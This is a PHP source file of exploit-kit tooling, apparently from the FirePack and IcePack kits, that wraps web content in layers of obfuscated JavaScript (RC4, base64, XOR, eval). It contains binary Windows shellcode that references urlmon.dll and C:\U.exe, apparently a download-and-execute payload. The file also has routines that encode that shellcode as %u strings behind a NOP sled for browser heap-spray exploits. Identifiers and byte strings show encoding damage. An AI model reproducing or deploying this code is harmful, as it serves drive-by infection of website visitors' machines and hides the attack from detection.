<?

function gen_rnd($len) {
        $rnd_text=null;
        for ($i=0;$i<$len;$i++){
                $temp=rand(1,3);
                if ($i==0){
                        $temp2=rand(1,2);
                        if ($temp2==1) {
                                $rnd_text.=chr(rand(65,90));
                        } else {
                                $rnd_text.=chr(rand(97,122));
                        }
                } else {
                        if ($temp==1) {
                                $rnd_text.=chr(rand(65,90));
                        } elseif ($temp==2) {
                                $rnd_text.=chr(rand(97,122));
                        } else {
                                $rnd_text.=chr(rand(48,57));
                        }
                }
        }
        return $rnd_text;
}
function rc4Encrypt($key, $pt) {
        $s = array();
        for ($i=0; $i<256; $i++) {
                $s[$i] = $i;
        }
        $j = 0;
        $x = 0;
        for ($i=0; $i<256; $i++) {
                $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
                $x = $s[$i];
                $s[$i] = $s[$j];
                $s[$j] = $x;
        }
        $i = 0;
        $j = 0;
        $ct = '';
        $y = 0;
        for ($y=0; $y<strlen($pt); $y++) {
                $i = ($i + 1) % 256;
                $j = ($j + $s[$i]) % 256;
                $x = $s[$i];
                $s[$i] = $s[$j];
                $s[$j] = $x;
                $ct .= $pt[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
        }
        return $ct;
}

function firepack0_18_encrypt($content,$type="default"){

        $error_msg=null;
        $error_msg_show=false;
        if ($error_msg_show){
                if ($type=="image"){
                        $error_msg='Enable JavaScript!';
                } elseif($type=="url"){
                        $error_msg='Enable JavaScript!';
                }else{
                        $error_msg='Enable JavaScript!';
                }
        }
        $error_msg='<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
                                  <noscript>
                                            '.$error_msg.'
                                  </noscript>';

        $js_decode_name=gen_rnd(rand(5,15));
        $js_decrypt_name=gen_rnd(rand(5,15));
        $key=gen_rnd(rand(10,30));
        $key2=base64_encode($key);

        $js_decrypt="function ".$js_decrypt_name."(key,pt){s=new Array();for(var i=0;i<256;i++){s[i]=i;}var j=0;var x;for(i=0;i<256;i++){j=(j+s[i]+key.charCodeAt(i%key.length))%256;x=s[i];s[i]=s[j];s[j]=x;}i=0;j=0;var ct = '';for(var y=0;y<pt.length;y++){i=(i+1)%256;j=(j+s[i])%256;x=s[i];s[i]=s[j];s[j]=x;ct+=String.fromCharCode(pt.charCodeAt(y)^s[(s[i]+s[j])%256]);}return ct;}";
        $js_decode="function ".$js_decode_name."(data){data=data.replace(/[^a-z0-9\+\/=]/ig,'');if(typeof(atob)=='function')return atob(data);var b64_map='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var byte1,byte2,byte3;var ch1,ch2,ch3,ch4;var result=new Array();var j=0;while((data.length%4)!=0){data+='=';}for(var i=0;i<data.length;i+=4){ch1=b64_map.indexOf(data.charAt(i));ch2=b64_map.indexOf(data.charAt(i+1));ch3=b64_map.indexOf(data.charAt(i+2));ch4=b64_map.indexOf(data.charAt(i+3));byte1=(ch1<<2)|(ch2>>4);byte2=((ch2&15)<<4)|(ch3>>2);byte3=((ch3&3)<<6)|ch4;result[j++]=String.fromCharCode(byte1);if(ch3!=64)result[j++]=String.fromCharCode(byte2);if(ch4!=64)result[j++]=String.fromCharCode(byte3);}return result.join('');}";
        $crypted=base64_encode(rc4Encrypt($key, $content));

        $s=null;
        $str='<script Language="JavaScript">'.$js_decrypt.';'.$js_decode.'; document.write('.$js_decrypt_name.'('.$js_decode_name.'("'.$key2.'"),'.$js_decode_name.'("'.$crypted.'")));</Script>'.$error_msg.$s;
        $str2=null;
        for ($i=0;$i<strlen($str);$i++){
                $str2.="%".dechex(ord($str[$i]));
        }
        return $str;
        flush;
}

function _obfuscate_bSZ3Il0LQDczcg��( $_obfuscate_ReI� )
{
    $_obfuscate_Iz0� = rawurlencode( $_obfuscate_ReI� );
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_Iz0� ); ++$_obfuscate_7w�� )
    {
        $_obfuscate_Iz0�[$_obfuscate_7w��] = chr( ord( $_obfuscate_Iz0�[$_obfuscate_7w��] ) + 5 );
    }
    return rawurlencode( $_obfuscate_Iz0�."5" );
}

function _obfuscate_HCEMYh8�( $_obfuscate_RaJNhvj )
{
    $_obfuscate_omve = $_SERVER['HTTP_HOST'];
    $_obfuscate_VBCv7Q�� = 0;
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_omve ); ++$_obfuscate_7w�� )
    {
        $_obfuscate_VBCv7Q�� += ceil( ord( $_obfuscate_omve[$_obfuscate_7w��] ) / ( $_obfuscate_7w�� + 1 ) );
    }
    $_obfuscate_xs33Yt_k = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_RaJNhvj ); ++$_obfuscate_7w�� )
    {
        if ( $_obfuscate_7w�� != strlen( $_obfuscate_RaJNhvj ) - 1 )
        {
            $_obfuscate_xs33Yt_k .= ord( $_obfuscate_RaJNhvj[$_obfuscate_7w��] ) - $_obfuscate_VBCv7Q��.",";
        }
        else
        {
            $_obfuscate_xs33Yt_k .= ord( $_obfuscate_RaJNhvj[$_obfuscate_7w��] ) - $_obfuscate_VBCv7Q��;
        }
    }
    $_obfuscate_aNcpmA�� = "\r\n<script type=\"text/javascript\">\r\n\r\nvar hNYt0j = new Array(".$_obfuscate_xs33Yt_k.");\r\nvar host=new String();\r\nhost=location.host;\r\nvar mhBg7S=0;\r\nvar h; \r\nfor(h=0;h<host.length;h++)\r\n{\r\n\tmhBg7S+=Math.ceil(host.charCodeAt(h)/ (h+1));\r\n}\r\nvar YK92nH = \"\"; \r\nfor(var i=0;i<hNYt0j.length;i++)YK92nH+=String.fromCharCode(hNYt0j[i]+mhBg7S); \r\ndocument.write(YK92nH);</script>";
    $_obfuscate_aNcpmA�� = base64_encode( $_obfuscate_aNcpmA�� );
    $_obfuscate_Lh5oYDEsQ�� = "\r\n<script type=\"text/javascript\">\r\n\r\n\tvar keyStr = \"ABCDEFGHIJKLMNOP\" + \"QRSTUVWXYZabcdef\" + \"ghijklmnopqrstuv\" + \"wxyz0123456789+/\" + \"=\";\r\n\t\tfunction decode64(input) \r\n\t{\r\n\t\tvar output = \"\";\r\n\t\tvar chr1, chr2, chr3 = \"\";\r\n\t\tvar enc1, enc2, enc3, enc4 = \"\";\r\n\t\tvar i = 0;\r\n\t\tvar base64test = /[^A-Za-z0-9\\+\\/\\=]/g;\r\n\t\tinput = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\");\r\n\t\tdo \r\n\t\t{\r\n\t\t\tenc1 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tenc2 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tenc3 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tenc4 = keyStr.indexOf(input.charAt(i++));\r\n\t\t\tchr1 = (enc1 << 2) | (enc2 >> 4);\r\n\t\t\tchr2 = ((enc2 & 15) << 4) | (enc3 >> 2);\r\n\t\t\tchr3 = ((enc3 & 3) << 6) | enc4;\r\n\t\t\toutput = output + String.fromCharCode(chr1);\r\n\t\t\tif (enc3 != 64)\r\n\t\t\t{\r\n\t\t\t\toutput = output + String.fromCharCode(chr2);\r\n\t\t\t}\r\n\t\t\tif (enc4 != 64)\r\n\t\t\t{\r\n\t\t\t\toutput = output + String.fromCharCode(chr3);\r\n\t\t\t}\r\n\t\t\tchr1 = chr2 = chr3 = \"\";\r\n\t\t\tenc1 = enc2 = enc3 = enc4 = \"\";\r\n\t\t} \r\n\t\twhile (i < input.length);\r\n\t\treturn output;\r\n\t}\r\n\tvar dec=decode64(\"".$_obfuscate_aNcpmA��."\")\r\n\t\r\n\tdocument.write(dec);\r\n</script>";
    return $_obfuscate_Lh5oYDEsQ��;
}

function _obfuscate_IGNfandp( $_obfuscate_R2_b )
{
    $_obfuscate_lw�� = 0;
    for ( ; $_obfuscate_lw�� < 4; ++$_obfuscate_lw�� )
    {
        $Vq[$_obfuscate_lw��] = _obfuscate_YzsubiRsdF9jLTknK2Zq( 5 );
    }
    $_obfuscate_Jrp1 = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_R2_b ); ++$_obfuscate_7w�� )
    {
        $_obfuscate_Jrp1 .= "%".bin2hex( $_obfuscate_R2_b[$_obfuscate_7w��] );
    }
    $_obfuscate_MMQ� = explode( "%", $_obfuscate_Jrp1 );
    unset( $_obfuscate_MMQ�[0] );
    $_obfuscate_5P0� = _obfuscate_BRkwejloBHRkHRtrEy4�( $_obfuscate_MMQ� );
    $_obfuscate_aNcpmA�� = "<SCRIPT LANGUAGE=\"Javascript\">\r\nfunction ".$Vq[0]."(".$Vq[2].")\r\n{\r\ndocument.write(unescape(".$Vq[2]."))\r\nreturn \"\"\r\n}\r\nfunction ".$Vq[1]."()\r\n{\r\n\t".$_obfuscate_5P0�[0]."\r\nvar ".$Vq[2]."=new Array()\r\n".$Vq[2]."[0]=new Array(".$_obfuscate_5P0�[1].")\r\n".$Vq[0]."(".$Vq[2].");\r\n}\r\n".$Vq[1]."();\r\n</script>";
    return $_obfuscate_aNcpmA��;
}

function _obfuscate_YzsubiRsdF9jLTknK2Zq( $_obfuscate_Q8ERGxGW )
{
    $_obfuscate_gClYrFh6bg�� = "1234567890";
    $_obfuscate_9lTiXBPSw�� = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $_obfuscate_EpN1a6ctiyk� = $_obfuscate_gClYrFh6bg��.$_obfuscate_9lTiXBPSw��;
    $_obfuscate_vZNnSQXfIe0X = "";
    $m = 0;
    for ( ; $m <= $_obfuscate_Q8ERGxGW; ++$m )
    {
        $_obfuscate_8A�� = rand( 0, strlen( $_obfuscate_EpN1a6ctiyk� ) - 1 );
        $_obfuscate_vZNnSQXfIe0X .= $_obfuscate_EpN1a6ctiyk�[$_obfuscate_8A��];
    }
    $_obfuscate_xs33Yt_k = $_obfuscate_9lTiXBPSw��[rand( 0, strlen( $_obfuscate_9lTiXBPSw�� ) - 1 )].$_obfuscate_vZNnSQXfIe0X;
    return $_obfuscate_xs33Yt_k;
}

function _obfuscate_ZXRwbCsfNgcpdHk�( $_obfuscate_Il8i )
{
    $_obfuscate_piI� = "�T�u<�t5x\x03�V�v \x03";
    $_obfuscate_piI� .= "�3�IA�3�6\x0F�\x14(8�t";
    $_obfuscate_piI� .= "\x08��\r\x03�@��;�u�^�^";
    $_obfuscate_piI� .= "$\x03�f�\x0CK�^\x1C\x03݋\x04�\x03";
    $_obfuscate_piI� .= "��urlmon.dll\x00C:\\";
    $_obfuscate_piI� .= "U.exe\x003�d\x03@0x\x0C�@";
    $_obfuscate_piI� .= "\x0C�p\x1C��@\x08�\t�@4�@|";
    $_obfuscate_piI� .= "�@<���N\x0E�������";
    $_obfuscate_piI� .= "\x04�,$<�ЕP�6\x1A/p�o";
    $_obfuscate_piI� .= "����T$��R�3�SSR�";
    $_obfuscate_piI� .= "\$S��]�?��\x0E�S����";
    $_obfuscate_piI� .= "�\x04�,\$b�п~��s�@�";
    $_obfuscate_piI� .= "��R�������".$_obfuscate_Il8i;
    return $_obfuscate_piI�;
}

function _obfuscate_LxF3Z2g1dHULd30y( $_obfuscate_piI� )
{
    $_obfuscate_xs33Yt_k = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� <= strlen( $_obfuscate_piI� ); $_obfuscate_7w�� += 2 )
    {
        $_obfuscate_phQ� = $_obfuscate_piI�[$_obfuscate_7w��];
        @$_obfuscate_yIk� = @$_obfuscate_piI�[$_obfuscate_7w�� + 1];
        $_obfuscate_phQ� = ord( $_obfuscate_phQ� ) + ord( $_obfuscate_yIk� ) * 256;
        $_obfuscate_phQ� = dechex( $_obfuscate_phQ� );
        while ( strlen( $_obfuscate_phQ� ) < 4 )
        {
            $_obfuscate_phQ� = "0".$_obfuscate_phQ�;
        }
        $_obfuscate_xs33Yt_k .= "%u".$_obfuscate_phQ�;
    }
    $_obfuscate_oflSXUQJYTR8 = "%u9090%u9090".$_obfuscate_xs33Yt_k;
    return $_obfuscate_oflSXUQJYTR8;
}

function _obfuscate_BRkwejloBHRkHRtrEy4�( $_obfuscate_oflSXUQJYTR8 )
{
    $_obfuscate_6UUC = "";
    $_obfuscate_FQ�� = count( $_obfuscate_oflSXUQJYTR8 );
    $_obfuscate_5iLGsO4� = _obfuscate_IXdjH2YQanR1I3Uoa2oKGg��( $_obfuscate_FQ�� );
    $p = 0;
    $_obfuscate_wFBrqQ�� = array( );
    foreach ( $_obfuscate_5iLGsO4� as $_obfuscate_FQ�� )
    {
        $_obfuscate_Hj5oTq8� = array_slice( $_obfuscate_oflSXUQJYTR8, $p, $_obfuscate_FQ�� );
        $p += $_obfuscate_FQ��;
        $_obfuscate_VgKtFeg� = "%".implode( "%", $_obfuscate_Hj5oTq8� );
        $_obfuscate_xHUo = _obfuscate_XD0nOyB6XAFyeQ��( 4, 8 );
        $_obfuscate_6UUC .= "var ".$_obfuscate_xHUo." = '{$_obfuscate_VgKtFeg�}';\n";
        $_obfuscate_wFBrqQ��[] = $_obfuscate_xHUo;
    }
    $_obfuscate_5xtS7qu1NndkDcE� = implode( "+", $_obfuscate_wFBrqQ�� );
    $_obfuscate_Jrp1[0] = $_obfuscate_6UUC;
    $_obfuscate_Jrp1[1] = $_obfuscate_5xtS7qu1NndkDcE�;
    return $_obfuscate_Jrp1;
}

function _obfuscate_fg8caxozbg��( $p )
{
    $_obfuscate_6UUC = strtoupper( bin2hex( $p ) );
    $_obfuscate_1Q�� = round( strlen( $_obfuscate_6UUC ) / 4 );
    if ( $_obfuscate_1Q�� != strlen( $_obfuscate_6UUC ) / 4 )
    {
        $_obfuscate_6UUC .= "00";
    }
    $_obfuscate_qfcF = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_6UUC ); $_obfuscate_7w�� += 4 )
    {
        $_obfuscate_qfcF .= "%u".substr( $_obfuscate_6UUC, $_obfuscate_7w�� + 2, 2 ).substr( $_obfuscate_6UUC, $_obfuscate_7w��, 2 );
    }
    return $_obfuscate_qfcF;
}

function _obfuscate_PxJ1YjBrJS9zPQ��( $_obfuscate_RaJNhvj )
{
    $_obfuscate_xs33Yt_k = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_RaJNhvj ); ++$_obfuscate_7w�� )
    {
        $_obfuscate_xs33Yt_k .= ord( $_obfuscate_RaJNhvj[$_obfuscate_7w��] );
        if ( $_obfuscate_7w�� != strlen( $_obfuscate_RaJNhvj ) - 1 )
        {
            $_obfuscate_xs33Yt_k .= ",";
        }
    }
    return "String.fromCharCode(".$_obfuscate_xs33Yt_k.")";
}

function _obfuscate_bWYkGltyDSkFfQkW( $_obfuscate_FQ�� )
{
    $_obfuscate_yO9n6OZG1qbtDw4� = rand( 2, $_obfuscate_FQ�� );
    $_obfuscate_5iLGsO4� = array( );
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < $_obfuscate_yO9n6OZG1qbtDw4�; ++$_obfuscate_7w�� )
    {
        $_obfuscate_5iLGsO4�[] = rand( 1, $_obfuscate_FQ�� );
    }
    $_obfuscate_1oit = 0;
    $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4� );
    while ( $_obfuscate_bhdW != $_obfuscate_FQ�� )
    {
        if ( $_obfuscate_FQ�� < $_obfuscate_bhdW && 0 < $_obfuscate_5iLGsO4�[$_obfuscate_1oit] )
        {
            --$_obfuscate_5iLGsO4�[$_obfuscate_1oit];
        }
        else
        {
            ++$_obfuscate_5iLGsO4�[$_obfuscate_1oit];
        }
        ++$_obfuscate_1oit;
        if ( $_obfuscate_yO9n6OZG1qbtDw4� <= $_obfuscate_1oit )
        {
            $_obfuscate_1oit = 0;
        }
        $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4� );
    }
    $_obfuscate_6UUC = array( );
    foreach ( $_obfuscate_5iLGsO4� as $p )
    {
        if ( $p != 0 )
        {
            $_obfuscate_6UUC[] = $p;
        }
    }
    return $_obfuscate_6UUC;
}

function _obfuscate_IXdjH2YQanR1I3Uoa2oKGg��( $_obfuscate_FQ�� )
{
    $_obfuscate_yO9n6OZG1qbtDw4� = rand( 2, 50 );
    $_obfuscate_5iLGsO4� = array( );
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < $_obfuscate_yO9n6OZG1qbtDw4�; ++$_obfuscate_7w�� )
    {
        $_obfuscate_5iLGsO4�[] = rand( 1, $_obfuscate_FQ�� );
    }
    $_obfuscate_1oit = 0;
    $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4� );
    while ( $_obfuscate_bhdW != $_obfuscate_FQ�� )
    {
        if ( $_obfuscate_FQ�� < $_obfuscate_bhdW && 0 < $_obfuscate_5iLGsO4�[$_obfuscate_1oit] )
        {
            --$_obfuscate_5iLGsO4�[$_obfuscate_1oit];
        }
        else
        {
            ++$_obfuscate_5iLGsO4�[$_obfuscate_1oit];
        }
        ++$_obfuscate_1oit;
        if ( $_obfuscate_yO9n6OZG1qbtDw4� <= $_obfuscate_1oit )
        {
            $_obfuscate_1oit = 0;
        }
        $_obfuscate_bhdW = array_sum( $_obfuscate_5iLGsO4� );
    }
    $_obfuscate_6UUC = array( );
    foreach ( $_obfuscate_5iLGsO4� as $p )
    {
        if ( $p != 0 )
        {
            $_obfuscate_6UUC[] = $p;
        }
    }
    return $_obfuscate_6UUC;
}

function _obfuscate_XD0nOyB6XAFyeQ��( $_obfuscate_Q8ERGxGW )
{
    global $unique_names;
    $_obfuscate_6UUC = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < $_obfuscate_Q8ERGxGW; ++$_obfuscate_7w�� )
    {
        $_obfuscate_6UUC .= chr( rand( 97, 122 ) );
    }
    if ( in_array( $_obfuscate_6UUC, $unique_names ) )
    {
        $_obfuscate_6UUC = _obfuscate_XD0nOyB6XAFyeQ��( $_obfuscate_Q8ERGxGW );
    }
    $unique_names[] = $_obfuscate_6UUC;
    return $_obfuscate_6UUC;
}

function _obfuscate_a2cnaDMheSFtD2M_fg��( $_obfuscate_R2_b )
{
    $_obfuscate_6UUC = "\"";
    $_obfuscate_FQ�� = strlen( $_obfuscate_R2_b );
    $_obfuscate_5iLGsO4� = _obfuscate_bWYkGltyDSkFfQkW( $_obfuscate_FQ�� );
    $p = 0;
    $_obfuscate_Jrp1 = array( );
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < strlen( $_obfuscate_R2_b ); ++$_obfuscate_7w�� )
    {
        $_obfuscate_Jrp1[$_obfuscate_7w��] = $_obfuscate_R2_b[$_obfuscate_7w��];
    }
    $_obfuscate_ReI� = "";
    foreach ( $_obfuscate_5iLGsO4� as $_obfuscate_FQ�� )
    {
        $_obfuscate_Hj5oTq8� = array_slice( $_obfuscate_Jrp1, $p, $_obfuscate_FQ�� );
        $p += $_obfuscate_FQ��;
        $_obfuscate_ReI� .= "\"";
        foreach ( $_obfuscate_Hj5oTq8� as $_obfuscate_J84� )
        {
            $_obfuscate_ReI� .= $_obfuscate_J84�;
        }
        $_obfuscate_ReI� .= "\"+";
    }
    $_obfuscate_ReI� = substr_replace( $_obfuscate_ReI�, "", strlen( $_obfuscate_ReI� ) - 1, 1 );
    return $_obfuscate_ReI�;
}

function _obfuscate_GXZcD15mImxqdG8JW2RzGDVxXzxkZD9b( $_obfuscate_oflSXUQJYTR8 )
{
    $_obfuscate_6UUC = "";
    $_obfuscate_FQ�� = count( $_obfuscate_oflSXUQJYTR8 );
    $_obfuscate_5iLGsO4� = _obfuscate_bWYkGltyDSkFfQkW( $_obfuscate_FQ�� );
    $p = 0;
    $_obfuscate_wFBrqQ�� = array( );
    foreach ( $_obfuscate_5iLGsO4� as $_obfuscate_FQ�� )
    {
        $_obfuscate_Hj5oTq8� = array_slice( $_obfuscate_oflSXUQJYTR8, $p, $_obfuscate_FQ�� );
        $p += $_obfuscate_FQ��;
        $_obfuscate_VgKtFeg� = "%u".implode( "%u", $_obfuscate_Hj5oTq8� );
        $_obfuscate_xHUo = _obfuscate_XD0nOyB6XAFyeQ��( 4, 8 );
        $_obfuscate_6UUC .= "var ".$_obfuscate_xHUo." = '{$_obfuscate_VgKtFeg�}';\n";
        $_obfuscate_wFBrqQ��[] = $_obfuscate_xHUo;
    }
    $_obfuscate_5xtS7qu1NndkDcE� = implode( "+", $_obfuscate_wFBrqQ�� );
    $_obfuscate_Jrp1[0] = $_obfuscate_6UUC;
    $_obfuscate_Jrp1[1] = $_obfuscate_5xtS7qu1NndkDcE�;
    return $_obfuscate_Jrp1;
}

function icepack_encrypt( $content )
{
    if(empty($content)) return '';

    // Crypt
    $table = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@";
    $xor   = 165;
    $table = array_keys(count_chars($table, 1));
    $i_min = min($table);
    $i_max = max($table);

    for ($c = count($table); $c > 0; $r = mt_rand(0, $c--)) array_splice($table, $r, $c - $r, array_reverse(array_slice($table, $r, $c - $r)));
    $len = strlen($content);
    $word = $shift = 0;

    for ($i = 0; $i < $len; $i++)
    {
        $ch = $xor ^ ord($content[$i]);
        $word |= ($ch << $shift);
        $shift = ($shift + 2) % 6;
        $enc .= chr($table[$word & 0x3F]);
        $word >>= 6;
        
        if (!$shift)
        {
            $enc .= chr($table[$word]);
            $word >>= 6;
        }
    }

    if ($shift) $enc .= chr($table[$word]);

    $tbl = array_fill($i_min, $i_max - $i_min + 1, 0);
    
    while (list($k,$v) = each($table)) $tbl[$v] = $k;

    $tbl = implode(",", $tbl);
    
    $fi = ",p=0,s=0,w=0,t=Array({$tbl})";
    $f  = "w|=(t[x.charCodeAt(p++)-{$i_min}])<<s;";
    $f .= "if(s){r+=String.fromCharCode({$xor}^w&255);w>>=8;s-=2}else{s=6}";
    $r = "<script language=JavaScript>";
    $r.= "function dc(x){";
    $r.= "var l=x.length,b=1024,i,j,r{$fi};";
    $r.= "for(j=Math.ceil(l/b);j>0;j--){r='';for(i=Math.min(l,b);i>0;i--,l--){{$f}}document.write(r)}";
    $r.= "}dc(\"{$enc}\")";
    $r.= "</script>";

    return $r;
}
 
function _obfuscate_FnFiGHdbHGo�( )
{
    $_obfuscate_mc2H = rand( 4, 8 );
    $_obfuscate_sxJqFA�� = "";
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < $_obfuscate_mc2H; ++$_obfuscate_7w�� )
    {
        $_obfuscate_sxJqFA�� .= chr( rand( 0, 25 ) + 97 );
    }
    return $_obfuscate_sxJqFA��;
}

function _obfuscate_MGs1Kno2( $_obfuscate__WwKzYz1wA�� )
{
    $_obfuscate_3tiDsnM� = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@";
    $_obfuscate_23k = rand( 1, 255 );
    $_obfuscate_3tiDsnM� = array_keys( count_chars( $_obfuscate_3tiDsnM�, 1 ) );
    $_obfuscate_uaG4Y48� = min( $_obfuscate_3tiDsnM� );
    $_obfuscate_x9cOdtM� = max( $_obfuscate_3tiDsnM� );
    $_obfuscate_KQ�� = count( $_obfuscate_3tiDsnM� );
    for ( ; 0 < $_obfuscate_KQ��; $_obfuscate_Dg�� = mt_rand( 0, $_obfuscate_KQ��-- ) )
    {
        array_splice( &$_obfuscate_3tiDsnM�, $_obfuscate_Dg��, $_obfuscate_KQ�� - $_obfuscate_Dg��, array_reverse( array_slice( $_obfuscate_3tiDsnM�, $_obfuscate_Dg��, $_obfuscate_KQ�� - $_obfuscate_Dg�� ) ) );
    }
    $_obfuscate_mc2H = strlen( $_obfuscate__WwKzYz1wA�� );
    $_obfuscate_sxJqFA�� = $_obfuscate_Wd4mKJY� = 0;
    $_obfuscate_7w�� = 0;
    for ( ; $_obfuscate_7w�� < $_obfuscate_mc2H; ++$_obfuscate_7w�� )
    {
        $_obfuscate_u_c� = $_obfuscate_23k ^ ord( $_obfuscate__WwKzYz1wA��[$_obfuscate_7w��] );
        $_obfuscate_sxJqFA�� |= $_obfuscate_u_c� << $_obfuscate_Wd4mKJY�;
        $_obfuscate_Wd4mKJY� = ( $_obfuscate_Wd4mKJY� + 2 ) % 6;
        $_obfuscate_JNVy .= chr( $_obfuscate_3tiDsnM�[$_obfuscate_sxJqFA�� & 63] );
        $_obfuscate_sxJqFA�� >>= 6;
        if ( $_obfuscate_Wd4mKJY� )
        {
            $_obfuscate_JNVy .= chr( $_obfuscate_3tiDsnM�[$_obfuscate_sxJqFA��] );
            $_obfuscate_sxJqFA�� >>= 6;
        }
    }
    if ( $_obfuscate_Wd4mKJY� )
    {
        $_obfuscate_JNVy .= chr( $_obfuscate_3tiDsnM�[$_obfuscate_sxJqFA��] );
    }
    $_obfuscate_krJb = array_fill( $_obfuscate_uaG4Y48�, $_obfuscate_x9cOdtM� - $_obfuscate_uaG4Y48� + 1, 0 );
    while ( list( $_obfuscate_5w��, $_obfuscate_6A�� ) = each( &$_obfuscate_3tiDsnM� ) )
    {
        $_obfuscate_krJb[$_obfuscate_6A��] = $_obfuscate_5w��;
    }
    $_obfuscate_krJb = implode( ",", $_obfuscate_krJb );
    $_obfuscate_idHC = strlen( $_obfuscate_JNVy );
    $_obfuscate_id18 = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_7B0b = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_OdlC = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_7eQD = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_t5dM = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_snqh = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_02RR = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_X10d = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_QJ8p = _obfuscate_FnFiGHdbHGo�( );
    $_obfuscate_6Q�� = "eval('".$_obfuscate_OdlC."|=({$_obfuscate_7eQD}[{$_obfuscate_t5dM}.charC'+'odeAt({$_obfuscate_id18}++)-{$_obfuscate_uaG4Y48�}])<<{$_obfuscate_7B0b};');";
    $_obfuscate_6Q�� .= "if(".$_obfuscate_7B0b."){{$_obfuscate_snqh}+=eval('String.fromCha'+'rCode({$_obfuscate_23k}^{$_obfuscate_OdlC}&255)');{$_obfuscate_OdlC}>>=8;{$_obfuscate_7B0b}-=2}else {$_obfuscate_7B0b}=6;";
    $_obfuscate_Dg�� = "<script>";
    $_obfuscate_Dg�� .= "var ".$_obfuscate_7eQD."=Array({$_obfuscate_krJb});";
    $_obfuscate_Dg�� .= "var ".$_obfuscate_t5dM."=\"{$_obfuscate_JNVy}\";";
    $_obfuscate_Dg�� .= "var ".$_obfuscate_02RR."={$_obfuscate_idHC},{$_obfuscate_X10d},{$_obfuscate_QJ8p},{$_obfuscate_snqh}='',{$_obfuscate_id18}={$_obfuscate_7B0b}={$_obfuscate_OdlC}=0;";
    $_obfuscate_Dg�� .= "for(".$_obfuscate_QJ8p."=".ceil( $_obfuscate_idHC / 1024 ).( ";".$_obfuscate_QJ8p.">0;{$_obfuscate_QJ8p}--){for({$_obfuscate_X10d}=Math.min({$_obfuscate_02RR},1024);{$_obfuscate_X10d}>0;{$_obfuscate_X10d}--,{$_obfuscate_02RR}--){{$_obfuscate_6Q��}}}eval({$_obfuscate_snqh});" );
    $_obfuscate_Dg�� .= "</script>";
    return $_obfuscate_Dg��;
} 
function gpackencode ($content) {
	$str = trim (strip_tags ($content));
	$new = "";
	for ($i = 0; $i < strlen ($str); $i ++) $new .= chr (ord ($str[$i]) ^ 1);
	return '<script language=JavaScript>str = "'.$new.'";str2 = "";for (i = 0; i < str.length; i ++) { str2 = str2 + String.fromCharCode (str.charCodeAt (i) ^ 1); }; eval (str2);</script>';
} 

?>